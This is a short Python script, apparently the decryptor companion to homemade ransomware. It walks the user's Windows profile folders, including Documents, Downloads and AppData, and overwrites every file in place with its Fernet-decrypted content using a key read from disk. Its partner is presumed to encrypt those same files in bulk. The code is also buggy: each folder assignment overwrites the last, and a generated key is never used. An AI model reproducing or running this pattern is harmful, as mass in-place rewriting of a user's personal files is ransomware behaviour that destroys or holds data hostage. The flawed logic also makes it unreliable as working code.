import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("chave.key", "rb") as chave:
    chave_secreta = chave.read()

usarname = os.getenv('USERNAME')

folders = [os.path.join(r"C:\Users", usarname, "Documents")]
folders = [os.path.join(r"C:\Users", usarname, "Pictures")]
folders = [os.path.join(r"C:\Users", usarname, "Videos")]
folders = [os.path.join(r"C:\Users", usarname, "Downloads")]
folders = [os.path.join(r"C:\Users", usarname, "AppData", "Local")]
folders = [os.path.join(r"C:\Users", usarname, "AppData", "Roaming")]

arquivo = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["test.py" , "chave.key", "teste2.py", "desktop.ini"]:
                continue

            file_path = os.path.join(root, file)
            arquivo.append(file_path)



for arquivo in arquivo:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

        conteudo_descriptografado = Fernet(chave_secreta).decrypt(conteudo)

        with open(arquivo, "wb") as file:
            file.write(conteudo_descriptografado)

